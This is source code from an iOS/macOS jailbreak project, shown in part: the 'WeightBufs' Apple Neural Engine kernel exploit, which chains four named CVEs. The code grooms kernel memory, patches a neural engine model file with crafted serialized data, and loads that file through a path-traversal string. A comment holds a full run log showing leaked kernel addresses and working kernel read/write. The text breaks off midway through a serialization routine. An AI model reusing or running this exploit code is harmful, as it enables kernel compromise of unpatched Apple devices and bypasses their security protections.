ZinComputeProgramStatus ZinComputeGetProgramSections(ZinComputeProgram *,
                                            uint32_t *,
                                            struct ZinComputeProgramSectionInfo **);

struct ZinComputeProgramInitInfo
{
        uint64_t count_index;
        void* unk_ptr;
        uint64_t unk_ptr_size;
};


struct compute_thread_binding;
struct ZinComputeProgramBinding
{
        struct load_command *load_command;
        void *unk_thread_obj;
        struct compute_thread_binding *thread_binding;
};

struct ZinComputeProgramSymbol {int a;};

struct __attribute__((aligned(8))) ZinComputeProgramSection
{
        struct section_64 *MachSections;
        struct ZinComputeProgramSegment *ProgramSegments;
        struct relocation_entries *relocation_entries;
        char *sect_start_addrs;
        u64 field_20;
};

struct ZinComputeProgramProcedure
{
        char *procedureName;
        u64 proc_fvmlib_count;
        struct ZinComputeProgramFvmlib **fvmlib;
        u64 ProcedcureOperationsCount;
        struct ZinComputeProcedureOperation **ProcedcureOperations;
        u64 field_28;
        u64 ProgramBindingsCount;
        struct ZinComputeProgramBinding **ProgramBindings;
};


struct ZinComputeProcedureOperation {int a;};
struct ZinComputeProgramFvmlib {int a;};
struct ZinComputeProgramSegment {int a;};


struct ZinComputeProgramStruct
{
        struct mach_header_64 *CP_mach_header;
        u64 CP_version;
        struct ident_command *CP_lc_ident;
        struct note_command *CP_lc_note;
        struct source_version_command *CP_lc_source_version;
        u64 CP_ProgramSegments_Count;
        struct ZinComputeProgramSegment *CP_ProgramSegments;
        u64 CP_fixed_vm_dylib_count;
        struct ZinComputeProgramFvmlib *CP_ProgramFvmlib;
        u64 CP_ThreadProcedureOperationsCount;
        struct ZinComputeProcedureOperation *CP_ThreadProcedureOperations;
        u64 CP_ThreadProceduresCount;
        struct ZinComputeProgramProcedure *CP_ThreadProcedures;
        struct symtab_command *CP_ProgramSymbolTable;
        struct ZinComputeProgramSymbol *CP_ProgramSymbols;
        u64 CP_unk_78;
        u64 CP_ThreadBindingCount;
        struct ZinComputeProgramBinding *CP_ThreadBindings;
};

enum THREAD_FLAVORS
{
        THREAD_PROCEDURE_OPERATION = 0x1,
        THREAD_FLAVORS_2 = 0x2,
        THREAD_BINDING = 0x3,
        THREAD_PROCEDURE = 0x4,
};


union compute_thread_command_flavors
{
        u8 * procedure_operation; // ane_op_state ?
        u8 * ane_bind_state; // ane_bind_state
        u8 * seg_thread_state; // ane_seg_thread_state_64
};


struct compute_thread_command
{
        u32 cmd;
        u32 cmdsize;
        enum THREAD_FLAVORS flavor;
        int count;
        union compute_thread_command_flavors thread_states;
};

struct compute_thread_binding
{
        u32 binding_typeinfo;
        u32 kind;
        char data[0xD20];
};

struct relocation_info
{
        int32_t r_address;
        uint32_t r_symbolnum;
};

struct relocation_entries
{
        struct relocation_info *relocs;
        struct ZinComputeProgramSymbol *Symbols;
        struct ZinComputeProgramSection *compute_sect;
};



struct ANECMutableProcedureInfoHeader {
        u64 field_0;
        u64 field_8;
        u64 field_10;
        u32 weight_buffer_size;
        u32 unk_20;
};

struct ANECMutableProcedureInfo
{
        struct ANECMutableProcedureInfoHeader hdr;
        uint64_t wb_offsets[0];
};

struct opsInfo
{
        uint32_t op_index;
        uint32_t op_count;
        uint64_t op_offsets[0];
};

struct weightInfo {
        uint64_t wi_index;
        uint64_t wi_offset;
        uint64_t wi_size;
};


typedef struct  {
        mach_port_t eventPort;
        uint32_t eventType;
        uint64_t waitValue;
        uint64_t unknown;
        uint64_t _mIOSurfaceSharedEvent;
        uint64_t field_20;
} Events;

typedef struct {
        uint32_t numWaitEvents;
        uint32_t numSignalEvents;
        Events WaitEvents[0x40];
        Events SignalEvents[0x40];
} H11ANESharedEventsStruct;



#if 0
struct ZinComputeProgramStruct
{
        struct mach_header_64 *mach_header;
        u64 version;
        struct ident_command *ident_cmd;
        stryct note_command *lc_note;
        struct source_version_command *lc_source_version;
        u64 segment_count;
        void *segments;                                         /* ZinComputeProgramSegment *segments; */
        u64 fixed_vm_dylibs_count;
        void *fixed_vm_dylibs;                                  /* ZinComputeProgramFvmlib */
        u64 size;
        void *lc_procedure_operation;                           /* ZinComputeProcedureOperation */
        u64 procedure_count;
        void  *procedures;                                      /* ZinComputeProgramProcedure */
        struct symtab_command *ProgramSymbolTable;
        void *ProgramSymbols;                                   /* ZinComputeProgramSymbol */
        u64 unk_78;
        u64 ProgramBindingCount;
        void *ProgramBinding;                                   /* ZinComputeProgramBinding */
};
#endif


struct OcgRasterizationInfoStruct
{
        u16 vals[4];
};

typedef struct
{
        u64 read_count;                             /* How many bytes I'd like to read ? */
        u64 read_offset;                            /* At which offset I should start reading data ?  */
        u64 global_chunk_size;
        u32 chunk_index;                            /* DeCxt::FileIndexToWeight() OOB Read due to lack of array index validation */
        u64 underflow;                              /* DeCxt::RasterizeScaleBiasData() OOB writes due to integer overflow vulnerability */
        struct OcgRasterizationInfoStruct ocg;
}serializer_info_t;


#endif  /* H_ANEPROGRAM_H */

```

`Application/Dopamine/Exploits/weightBufs/exploit/exploit.h`:

```h
#ifndef H_EXPLOIT_H
#define H_EXPLOIT_H

//#define dbg printf
#define dbg(x, ...)


#include "iokit.h"
#include "IOSurface.h"
#include "IOGPU.h"
#include "ANEDirectIn.h"
#include "aneProgram.h"
#include <sys/utsname.h>
#include <Foundation/Foundation.h>
#include "AppleNeuralEngine/_ANEModel.h"
#include "AppleNeuralEngine/_ANEClient.h"

#define FOR_EACH_COMMAND                                                \
        lc = (struct load_command*)(mh + 1);                                   \
        for (int i = 0; i < mh->ncmds; ++i, lc = (struct load_command*)((char*)lc + lc->cmdsize))

#if TARGET_OS_OSX
#define xpacd(addr)  ((addr) | ((uint64_t)0xfffffe00 << 32))
#else
#define xpacd(addr)  ((addr) | ((uint64_t)0xfffffff0 << 32))
#endif

#define TOTAL_PORTS 0x1300


#if TARGET_OS_OSX

#define MAX_PROGRAMS            5
#define IOSURFACE_OBJ_SIZE      0x440
#define MAX_SHMEMS              0x2000

#else

#define MAX_PROGRAMS            5
#define IOSURFACE_OBJ_SIZE      0x8
#define MAX_SHMEMS              0x2000

#endif  /* TARGET_OS_OSX */

#define MAX_TRIES               0x10

struct exploit {

        u8 * initInfo;                       /* INIT:__text 'initInfo' section, where serialized data is located */
        u32 initInfo_sz;                    // The size of the allocated section

        io_connect_t iosurface;
        u32 weightsSurface;

        u8 * weightsBuffer;          // weight surface buffer
        size_t weightsBufferSize;       // weight surface size

        u32 InOutSurface;
        u32 groom_surface_count;

        u32 groom_pageable_maps_count;
        struct shmem *shmems[MAX_SHMEMS * MAX_TRIES];
        u32 shmems_count;

        u32 groom_kernel_map_count;
        bool kernel_map_groom_done;

        void *mh;
        size_t mh_size;
};


struct H11ANESharedMemorySurfaceParamsStruct {
        size_t size;
        u64 p_IOSurface;
        u64 dartMapBase;
        u64 surface_memDesc;
        u64 surface_memMap;
        u64 surface_address;
        u64 dmaCommand;
        u32 name;
        u32 unkown32;
        u64 unkown64;
};

struct matched_surface {
        u32 surface_id;
        u8 * loc;
        u64 IOSurfaceClient_loc;
        u64 IOSurface_loc;
};


struct kern_rw
{
        u8 * shm_uaddr;
        u64 shm_kaddr;
        u64 shm_size;
        u32 surface_id;
        u32 shm_id;
};

void init_structs(void);
void groom_pageable_maps_with_iogpu_cmdbufs(void);
mach_port_t sr(void);
void hwx_init_frameworks(void);
void hwx_patch_model(void);
void _hwx_patch_model(struct mach_header_64 *,size_t ,u8 ** );
uint64_t hwx_load_model(void);
uint64_t hwx_patch_and_load_model(void);
void hwx_unload_model(u64);


int exploit(uint64_t *kernelBaseOut);

#endif  /* H_EXPLOIT_H */

```

`Application/Dopamine/Exploits/weightBufs/exploit/exploit.m`:

```m
/*
 * WeightBufs : Apple Neural Engine (ANE) kernel exploit for iOS 15/macOS 12
 * Vulns && Exploit by @_simo36
 *
 * - Bugs :
 * CVE-2022-32845 : aned signature check bypass for model.hwx.
 * CVE-2022-32948 : DeCxt::FileIndexToWeight() OOB Read due to lack of array index validation
 * CVE-2022-42805 : ZinComputeProgramUpdateMutables() potential arbitrary read due to Integer overflow issue
 * CVE-2022-32899 : DeCxt::RasterizeScaleBiasData() OOB writes due to integer underflow vulnerability
 *
 * - Tested on :
 * iPhone12 Pro (iPhone13,3) with iOS 15.5
 * iPad Pro (iPad8,10) with iPadOS 15.5
 * iPhone11 Pro (iPhone12,3) with iOS 15.4.1
 * MacBookAir10,1 M1 with macOS 12.4

 [+] Loading AppleNeuralEngine framework ...OK
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Stage 1: Grooming kernel memory ...
 [+] Grooming IOSurface_zone ... OK
 [+] Grooming pageable maps ... OK
 [+] Grooming kernel_map ... . . . . . OK
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Found scratched ShmemID 0x1f6b with size 0x4000
 00 40 00 00 00 00 00 00  E0 A9 E6 9F E4 FF FF FF  |  .@..............
 00 00 B4 02 00 00 00 00  68 6C 55 CF E2 FF FF FF  |  ........hlU.....
 E0 F2 51 CF E2 FF FF FF  00 40 1B FF EF FF FF FF  |  ..Q......@......
 38 04 E8 66 E6 FF FF FF  4B 54 55 4D 01 00 00 00  |  8..f....KTUM....
 00 00 00 00 00 00 00 00                           |  ........
 [+] Leaked mutable kernel section (MUTK) buffer 0xffffffefff1b4000
 [+] Leaked IOSurface object 0xffffffe49fe6a9e0
 [+] Kernel location of our input buffer 0xffffffefff074000
 [+] Stage 3: Dumping a memory page from IOSurface_zone
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Found scratched ShmemID 0x1fb8 with size 0x4000
 [+] Found a matching surface-id=0x018f IOSurface=0xffffffe49fe68000 !
 [+] Found a matching surface-id=0x0195 IOSurface=0xffffffe49fe68430 !
 [+] Found a matching surface-id=0x0191 IOSurface=0xffffffe49fe69d50 !
 [+] Found a matching surface-id=0x0192 IOSurface=0xffffffe49fe6a180 !
 [+] Found a matching surface-id=0x0194 IOSurface=0xffffffe49fe6b240 !
 [+] Found a matching surface-id=0x018e IOSurface=0xffffffe49fe6baa0 !
 [+] IOSurfaceClient location 0xffffffe666eeab20
 [+] IOSurface location 0xffffffe49fe6baa0
 [+] IOSurfaceRoot 0xffffffe2ce25e000
 [+] Stage 4: Performing the arbitrary write primitive ...
 [+] Patching model.hwx with custom initInfo section ... OK
 [+] Got shmem id 0x1fb8 for 0xffffffefff074000
 [+] Stage 5: Get stable arbitrary kernel read/write .... OK
 [+] IOSurfaceRoot vtable 0xfffffff018456db0
 [+] kread64([0xfffffff018456db0]) = 0x39bbc170194012f4
 [+] kread64([0xffffffefff077000]) = 0x4141414100003000
 [+] kwrite64(0xffffffefff077000,0xdeadbeef12345678)
 [+] kread64([0xffffffefff077000]) = 0xdeadbeef12345678
 [+] Kernel text base 0xfffffff017bb8000
 CF FA ED FE 0C 00 00 01  02 00 00 C0 02 00 00 00  |  ................
 1A 00 00 00 90 16 00 00  01 00 20 00 00 00 00 00  |  .......... .....
 19 00 00 00 C8 02 00 00  5F 5F 54 45 58 54 00 00  |  ........__TEXT..
 00 00 00 00 00 00 00 00  00 80 BB 17 F0 FF FF FF  |  ................
 00 40 6F 00 00 00 00 00  00 00 00 00 00 00 00 00  |  .@o.............
 00 40 6F 00 00 00 00 00  05 00 00 00 05 00 00 00  |  .@o.............
 08 00 00 00 00 00 00 00  5F 5F 63 6F 6E 73 74 00  |  ........__const.
 [+] Cleanup done
 system name = Darwin
 node name   = iPhone12-Pro
 release     = 21.5.0
 version     = Darwin Kernel Version 21.5.0: Thu Apr 21 21:51:27 PDT 2022; root:xnu-8020.122.1~1/RELEASE_ARM64_T8101
 machine     = iPhone13,3


*/


#include "exploit.h"


struct exploit *p = NULL;

serializer_info_t *sinfo = NULL;
io_connect_t client = IO_OBJECT_NULL, surface_client = IO_OBJECT_NULL;


struct H11ANESharedMemorySurfaceParamsStruct aneMemSurface = {};

H11ANESharedEventsStruct *events = NULL;

extern uint32_t * prop_data;

struct kern_rw krw = {};

IOSurfaceID g_IOSurfaceIds[0x4000];
u32 g_IOSurfaceIds_count;
struct matched_surface matched = {};


u64 IOSurfaceRoot = 0;
u64 self_task = 0;
u64 IOSurface_zone_page = 0;
#define store_surface_id(id)                            \
        assert(g_IOSurfaceIds_count < 0x4000);          \
        g_IOSurfaceIds[g_IOSurfaceIds_count++] = (id)


#if TARGET_OS_OSX
_ANEModel * md = nil;
_ANEClient * anec  = nil;

#else   /* iOS/iPadOS  */

id  md = nil;
id  anec  = nil;

#define _ANEModel __ANEModel
#define _ANEClient __ANEClient
Class __ANEModel;
Class __ANEClient;
char *gBundle = NULL;


void hwx_init_frameworks(void)
{
        printf("[+] Loading AppleNeuralEngine framework ...");
        __ANEModel = NSClassFromString(@"_ANEModel");
        __ANEClient = NSClassFromString(@"_ANEClient");

        size_t size = 0x1000;
        char *bundle_path = (char *)calloc(1,size);
        CFBundleRef bundle = CFBundleGetBundleWithIdentifier(CFSTR("com.opa334.weightBufs"));
        CFURLRef url = CFBundleCopyBundleURL(bundle);
        CFURLGetFileSystemRepresentation(url, true, (UInt8 *)bundle_path, size);

        //CFURLGetFileSystemRepresentation(CFBundleCopyBundleURL(CFBundleGetMainBundle()), true, (UInt8 *)bundle_path, 0x1000);
        CFRelease(url);
        //printf("%s \n",bundle_path);
        gBundle = bundle_path;
        printf("OK\n");
}

#endif

void hwx_patch_model(void)
{
        printf("[+] Patching model.hwx with custom initInfo section ... ");
        size_t mh_size = 0;

#if TARGET_OS_OSX
        if(!p->mh)
                p->mh = load_file("model_tmp.hwx",&mh_size);

        /* void *mh = load_file("model_tmp.hwx",&mh_size); */

        struct mach_header_64 * mutable_mh = (struct mach_header_64 *)calloc(1,p->mh_size+0x10000);
        memcpy((void *)mutable_mh,(void *)p->mh,p->mh_size);

        u8* initInfo = NULL;
        _hwx_patch_model(mutable_mh,p->mh_size,&initInfo);
        assert(initInfo);

        memcpy(initInfo,p->initInfo,p->initInfo_sz);
        int fd = open("/var/tmp/model.hwx",O_RDWR|O_CREAT, 0777);
        assert(fd != -1);

        p->mh_size+=0x10000;
        ssize_t rb = write(fd,mutable_mh,p->mh_size);
        assert(rb == p->mh_size);
        close(fd);


#else
        gBundle[strlen(gBundle)] = '/';

        char *tmp_model = "model_tmp.hwx";
        char *mfile = (char*)calloc(strlen(gBundle) + strlen(tmp_model),1);
        assert(mfile);
        memcpy(mfile,gBundle,strlen(gBundle));
        memcpy(mfile+strlen(gBundle),tmp_model,strlen(tmp_model));

        if(!p->mh)
                p->mh = load_file(mfile,&p->mh_size);

        const char *model_path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"model.hwx"].cString;// s.cString;
        int fd = open(model_path,O_RDWR|O_CREAT, 0644);
        if(fd == -1) {
                perror("open");
                exit(0);
        }

        struct mach_header_64 * mutable_mh = (struct mach_header_64 *)calloc(1,p->mh_size+0x10000);
        memcpy((void *)mutable_mh,(void *)p->mh,p->mh_size);

        u8* initInfo = NULL;
        _hwx_patch_model(mutable_mh,mh_size,&initInfo);
        assert(initInfo);

        memcpy(initInfo,p->initInfo,p->initInfo_sz);
        p->mh_size+=0x10000;
        ssize_t rb = write(fd,mutable_mh,p->mh_size);
        assert(rb == p->mh_size);
        close(fd);

#endif                         /* TARGET_OS_OSX */

        printf("OK\n");
}


uint64_t hwx_load_model(void)
{
        dbg("[+] Loading model.hwx  .. ");
#if TARGET_OS_OSX
        NSString  * model_str = @"/var/";
        NSString  * model_str2 = @"../../../../../../../../../../../../var/tmp/";
#else
        NSString  * model_str = NSTemporaryDirectory();

        char bundle_path_traversal[0x2000] = {0};
        snprintf(bundle_path_traversal,0x2000,"../../../../../../../../../../../../../%s",
                 NSTemporaryDirectory().cString );
        NSString *model_str2 = [NSString stringWithCString:bundle_path_traversal encoding:NSUTF8StringEncoding];
#endif
        NSError * err;

        NSURL  * model_url = [NSURL URLWithString: model_str];
        md = [_ANEModel modelAtURL:model_url key:@""];
        anec  = [_ANEClient sharedConnection];
        NSDictionary *opts = [NSMutableDictionary dictionary];

        [opts setValue:model_str forKey:@"kANEFIsInMemoryModelTypeKey"];
        [anec loadModel:md options:opts qos:2 error:&err];
        [opts setValue:@YES forKey:@"kANEFInMemoryModelIsCachedKey"];
        [opts setValue:model_str2 forKey:@"kANEFIsInMemoryModelTypeKey"];
        [anec loadModel:md options:opts qos:1 error:&err];


        if([md programHandle])
                dbg("OK\n");
        else {
                /* In terminal : 'idevicesyslog -u UDID --debug --match AppleH11ANEInterface' */
                /* if your see "Macho is not build", it means you've to guess the macho->cpu */
                printf("FAIL\n");
                printf("[-] Unable to load model.hwx. First make sure the macho->cpusubtype is correct. \n"
                       "\tIf so, type 'idevicesyslog -u UDID --debug --match AppleH11ANEInterface' to figure out the error\n");
                exit(0);
        }
        return [md programHandle];

}

 /* TODO : use program_handle arg */
void hwx_unload_model(u64 /* unused */ program_handle)
{
        dbg("[+] Unload program ... ");
        NSError *err = nil;
        NSDictionary *opts = [NSMutableDictionary dictionary];
        [anec purgeCompiledModel:md];
        [anec unloadModel:md options:opts qos:1 error:&err];
        dbg("OK\n");
}

uint64_t hwx_patch_and_load_model(void)
{
        hwx_patch_model();

        return hwx_load_model();
}

H11ANESharedEventsStruct * prepare_SignalWaitEvents(uint32_t numWaits, uint32_t numSignals,io_connect_t *surface_client)
{
        assert((numWaits <= 0x40) && (numSignals <= 0x40));
        H11ANESharedEventsStruct * SharedEvents = (H11ANESharedEventsStruct*)calloc(0x1408,1);
        assert(SharedEvents != NULL);

        SharedEvents->numWaitEvents = numWaits;
        SharedEvents->numSignalEvents = numSignals;
        mach_port_t shared_event = iosurface_create_shared_event(p->iosurface);

        for(int i=0; i < numWaits; i++) {
                SharedEvents->WaitEvents[i].eventPort = shared_event;
                SharedEvents->WaitEvents[i].waitValue = 0x41414141;

        }

        for(int i=0; i < numSignals; i++) {
                SharedEvents->SignalEvents[i].eventPort = shared_event;
                SharedEvents->SignalEvents[i].waitValue = 0x41414141;
                SharedEvents->SignalEvents[i].eventType = 2;

        }

        if(surface_client != NULL) *surface_client = p->iosurface;

        return SharedEvents;
}

void signal_wait_event(H11ANESharedEventsStruct *ev,uint32_t index,u64 waitValue)
{
        if(index == -1) {
                for(int i=0; i < ev->numWaitEvents; i++)

                        iosurface_signal_shared_event(surface_client,
                                                      ev->WaitEvents[i].eventPort,
                                                      waitValue + i);
                return;
        }
        assert(index < ev->numWaitEvents);
        iosurface_signal_shared_event(surface_client,
                                      ev->WaitEvents[index].eventPort,
                                      waitValue + index);
}

H11ANEProgramRequestArgsStruct * prepare_sendRequest(H11ANESharedEventsStruct *ev,
                                                     u64 program_handle)
{
        H11ANEProgramRequestArgsStruct * rq = (H11ANEProgramRequestArgsStruct *)calloc(0xA60,1);

        rq->programHandle = program_handle;

        rq->total_InputBuffers = 2;
        rq->inputBufferSurfaceId[0] = p->InOutSurface;
        rq->inputBufferSurfaceId[1] = p->InOutSurface;
        rq->inputBufferSymbolIndex[0] = 0;
        rq->inputBufferSymbolIndex[1] = 1;

        rq->weightsBufferSurfaceId  = p->weightsSurface;

        rq->total_OutputBuffers = 1;
        rq->outputBufferSurfaceId[0] = p->InOutSurface;

        rq->EventsAddr = (u64)ev;

        return rq;
}

void do_open_ane_device(u64 program_handle)
{
        client = iokit_get_connection("H11ANEIn",1);
        struct H11ANEDeviceInfoStruct din = {0};

        din.fields[0] = program_handle;
        din.fields[1] = 0x414141414141;
        *(uint32_t *)((char*)&din + 0x20) = 0x111;
        *(uint32_t *)((char*)&din + 0x30) = 0x222;

        do__ANEDriect_DeviceOpen(client,&din);
}

bool dev_open = false;
kern_return_t do_send_ane_request(u64 program_handle)
{
        if(dev_open == false) {
                do_open_ane_device(program_handle);
                dev_open = true;
        }

        H11ANEProgramRequestArgsStruct * request = prepare_sendRequest(events,0);
        if(!events)
                events = prepare_SignalWaitEvents(0,0,&surface_client);

        request->programHandle = program_handle;
        mach_port_t async = sr();
        kern_return_t kr = do__ANEDirect_ProgramSendRequest(client,async,request);
        if(kr == 0xe00002be) {
                IOServiceClose(client);
                client = IO_OBJECT_NULL;
                dev_open = false;
                printf("SendRequest failed ... \n");
        }

        free(request);
        mach_port_deallocate(mach_task_self(),async);
        return kr;
}

mach_port_t sr(void)
{
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        assert(kr == KERN_SUCCESS);
        kr = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
        assert(kr == KERN_SUCCESS);
        return p;
}

/*
 * I want IOSurface_zone to gather few pages before spraying kernel_map
 * and IOKit pageable maps. Then release some IOSurface objects to create
 * holes for IOSurface allocations that the neural engine driver will make soon.
 * As a result, they could fall between our newly created IOSurface objects.
 * The intentions behind this are:
 * 1- Ensure that IOSurface zone does not request additional pages in the future.
 * 2- I want to leak a memory page from IOSurface zone that contains at least one IOSurface object created by our exploit. This is an important step toward the kernel r/w primitive.
 */
void groom_IOSurface_zone(void)
{
        printf("[+] Grooming IOSurface_zone ... ");
        IOSurfaceID released[0x10] = {};
        u32 release_count = 0;

         /* Fill IOSurface_zone with bunch of IOSurface allocations */
        /* for(int i =0; i < 0x200; i+=1) { */
        for(int i =0; i < p->groom_surface_count; i++) {
                u32 ssid = 0;
                IOSurfaceFastCreateArgs args = {0};
                args.IOSurfaceAddress = 0;
                args.IOSurfaceAllocSize =  0x4000;
                create_surface_fast_path(p->iosurface, &ssid, &args);

                /* if( ((i & 0x10) == 0) && (i > 5) && (release_count < 10)) */
                /* For each page, release one IOSurface object */
                if( ((i & 0x10) == 0) && (i > 5) && (release_count < 5))
                        released[release_count++] = ssid;
                else
                        store_surface_id(ssid);
        }

        for(int i=0; i < release_count;i++) {
                release_surface(p->iosurface,released[i]);
        }

        printf("OK\n");
}

/*
 * I want to fill gIOKitPageableSpace's first sub-map.
 * As a result, when the next submap is assigned, its address range will (hopefully) be at a higher location.
 * This is however not guaranteed due to the kernel_map randomization.
 */
static void groom_pageable_maps(void)
{
        printf("[+] Grooming pageable maps ... ");
#if TARGET_OS_OSX
        io_connect_t c =iokit_get_connection("IOGPU",5);
#else
        io_connect_t c = iokit_get_connection("IOGPU",1);
#endif
        u32 q = 0;
        char input[1032] = {0};

        memset(input,0x41,0x400);
        * (uint32_t *)(input + 0x400) = 1 % 5;
        * (uint32_t *)(input + 0x404) = 1;

        struct IOGPUNotificationQueueData *n = do_s_create_notificationqueue(c);
        do_s_new_command_queue(c,&input,&q);

        do_s_set_command_queue_notification_queue(c,q,n->id);

        /* uint32_t count = MAX_SHMEMS - 1; */
        uint32_t count = p->groom_pageable_maps_count - 1;
        for(int i=0; i < count; i++) {
                struct shmem * shm = do_s_create_shmem(c,0x4000,1);;
                assert(!mlock(shm->shm_addr,shm->shm_len));
                p->shmems[p->shmems_count] = shm;
                p->shmems_count++;
        }

        IOGPUCommandQueueSubmitArgs_t *args = (IOGPUCommandQueueSubmitArgs_t *)calloc(0x28,1);
        args->hdr.count = 1;

        IOGPUCommandQueueSubmitArgs_Command_t *submit_args = &args->body[0];
        submit_args->notify_1 = 0x1111;
        submit_args->notify_2 = 0x2222;
        submit_args->shmid_1 = p->shmems[0]->shm_id;
        submit_args->shmid_2 = p->shmems[1]->shm_id;
        submit_args->shmid_3 = p->shmems[2]->shm_id;

        struct Shmem3 * shm3_data = (struct Shmem3 *)p->shmems[0]->shm_addr;

        struct IOGPUKernelCommand * cmd = (struct IOGPUKernelCommand * )p->shmems[1]->shm_addr;
        cmd->size = 8;
        cmd->type = 2;
        cmd->cmd.Cmd_0x2.sleep = 1;

        shm3_data->hdr.fieldC = 0x40000001;
        shm3_data->hdr.field0 = 0x42424242;
        shm3_data->off.kernelCommandStart = 0;
        shm3_data->off.kernelCommandEnd = sizeof(struct IOGPUKernelCommand) + 8;

        /* This is how pageable maps look like after spraying :                                     */
        /*   size=0x4000                                                                            */
        /*  <============>                                                                          */
        /* +--------------+--------------+--------------+-----+--------------+--------------------+ */
        /* | DeviceShmem1 | DeviceShmem2 | DeviceShmem3 | ... | DeviceShmemN |         ...        | */
        /* +--------------+--------------+--------------+-----+--------------+--------------------+ */
        /*  */
        for(int i = 0; i < (count -3); i+=3) {
                submit_args->shmid_1 = p->shmems[i]->shm_id;
                submit_args->shmid_2 = p->shmems[i+1]->shm_id;
                submit_args->shmid_3 = p->shmems[i+2]->shm_id;
                do_s_submit_command_buffers(c,q,(uint8_t*)args,0x28 + 8);
        }
        printf("OK\n");

}


struct shmem * lookup_scratched_shmem(u64 scratch,u32 size,u32 *offset)
{
        /* printf("[+] Call lookup_scratched_shmem() \n"); */
        for(u32 i=0; i < p->shmems_count;i++) {

                u8 * tmp = (u8*)memmem(p->shmems[i]->shm_addr,p->shmems[i]->shm_len,&scratch,size);
                if(tmp) {
                        printf("[+] Found scratched ShmemID 0x%x with size 0x%x\n",
                               p->shmems[i]->shm_id,p->shmems[i]->shm_len);
                        *offset = (u32)(tmp - (u8 *)p->shmems[i]->shm_addr);
                        return p->shmems[i];
                }
        }
        return NULL;
}

uint32_t subtypeToUse = 0;

void _hwx_patch_model(struct mach_header_64 *mh,size_t mh_size,u8 ** initInfo)
{
        if((mh->magic != 0xfeedface) && (mh->magic != 0xbeefface)) {
                printf("[-] Not a mach-O file \n");
                assert(false);
        }
    
        mh->cpusubtype = subtypeToUse;

        struct load_command *lc = NULL;
        FOR_EACH_COMMAND {

                if (lc->cmd == LC_SEGMENT_64) {
                        struct segment_command_64 *seg = (struct segment_command_64*)lc;
                        dbg("Found LC_SEGMENT_64 %s \n",seg->segname);
                        struct section_64 * sct_start = (struct section_64*)(seg + 1);
                        struct section_64 * sct_end = &sct_start[seg->nsects];

                        for (struct section_64* sect=sct_start; (sect < sct_end); ++sect) {
#if 0
                                printf("%s :section %s Flags 0x%x size = 0x%llx \n",
                                    sect->segname,sect->sectname,sect->flags,sect->size);
#endif
                                if(!strcmp(sect->segname,"__TEXT") && !strcmp(sect->sectname,"__const")) {
                                        sect->flags = 0x2C;
                                        *initInfo = (u8 *)mh + sect->offset;;
                                }

                                if(!strcmp(sect->segname,"__FVMLIB") && !strcmp(sect->sectname,"__fvmlib_init0")) {
                                        dbg("Found __fvmlib_init0 section \n");
                                        sect->flags = 0;
                                }

                                if(!strcmp(sect->segname,"__INIT") && !strcmp(sect->sectname,"__text")) {
                                        sect->flags = 0x2a;
                                }

                        }

                } else if (lc->cmd == LC_THREAD) {
                        struct compute_thread_command *thread = (struct compute_thread_command *)lc;
                        switch (thread->flavor) {
                        case THREAD_PROCEDURE_OPERATION: {
                                *(uint64_t*)((char*)thread + 0x830 + 0x10) = rand();  /* 0x10 is the load cmd size */
                                break;
                        }
                        default:
                                break;
                        }
                }

        }

}

/* Prepare the weight buffer content */
static void setup_ANECMutableProcedureInfo(u8 *address,size_t address_size,
                                           size_t total_size,size_t chunk_size,
                                           u64 chunk_offset)
{
        bzero(address,address_size);
        uint32_t weight_size = 0x1;

        struct ANECMutableProcedureInfo * pinfo = (struct ANECMutableProcedureInfo *)address;
        pinfo->hdr.weight_buffer_size = weight_size;
        struct weightInfo *mw = NULL;

        for(int i=0; i < weight_size; i++) {
                pinfo->wb_offsets[i] = 0x200;
                struct opsInfo *ops = (struct opsInfo *)((u8*)pinfo + pinfo->wb_offsets[i]);
                ops->op_count = (u32)total_size/0x10;

                for(int j = 0; j < ops->op_count; j++  ) {
                        ops->op_offsets[j] = 0x1000;
                        mw = (struct weightInfo *)((u8 *)pinfo + ops->op_offsets[j]);
                        mw->wi_index = 0;
                        mw->wi_offset = chunk_offset;
                        mw->wi_size = chunk_size;
                }
        }
}

#define __set8(ptr,val)                         \
        *ptr++ = val;

#define __set16(ptr,val)                           \
        *(u16 *)ptr = val;                         \
        ptr+=2;

#define __set32(ptr,val)                          \
        *(u32 *)ptr = val;                        \
        ptr+=4;

#define __set64(ptr,val)                          \
        *(u64 *)ptr = val;                        \
        ptr+=8;

#define DeCxt_GetFileInfo(ptr,index32,offset64,size64)                  \
        *(u32 *) ptr =  index32;                                        \
        *(u64 *) (ptr + 4)  =  offset64;                                \
        *(u64 *) (ptr + 12) =  size64;                                  \
        ptr+=20;

#define DeCxt_GetWeightInfo(ptr,val8,val16_ptr)         \
        *ptr++ = val8;                                  \
        for(int i=0 ; i < 5;i++) {                      \
                *(u16 *)(ptr) = val16_ptr[i];           \
                ptr+=2;                                 \
        }                                               \

#define DeCxt_ParseTransformInfo(ptr,val8, val16_ptr)   \
        *ptr++ = val8[0];                               \
        *ptr++ = val8[1];                               \
        *ptr++ = val8[2];                               \
                                                        \
        *(u16 *)ptr = val16_ptr[0]; ptr+=2;             \
        *(u16 *)ptr = val16_ptr[1]; ptr+=2;             \
        *(u16 *)ptr = val16_ptr[2]; ptr+=2;             \


#define DeCxt_ParseOcgRasterizationInfo(ptr,val16_ptr)  \
        for(int i=0 ; i < 4;i++) {                      \
                *(u16 *)(ptr) = val16_ptr[i];           \
                ptr+=2;                                 \
        }                                               \

/* Serialize init_section then patch model.hwx's init_section later before loading it */
static void serialize_initinfo_section(u8 *init_info,serializer_info_t *info)
{
        dbg("[+] Serializing init_section header  \n");
        u8 * ptr = init_info;
        u8 * info_hdr = (u8 *)init_info;

        /* DeCxt::ParseHeader */
        __set32(info_hdr,2);
        __set32(info_hdr,0x80);
        __set32(info_hdr,2);
        __set32(info_hdr,2);

        ptr = info_hdr;
        __set64(ptr,0x2000);
        *(u64 *)(init_info + 0x2000 ) = 0x2000;;
        *(u64 *)(init_info + 0x2000 + 8) = 0x3000;

        /* DeCxt::ProcessInitInfo */

        /* -> DeCxt::ParseScaleBiasWeightFileInfo */
        u8 *ptr2 = init_info + 0x3000;
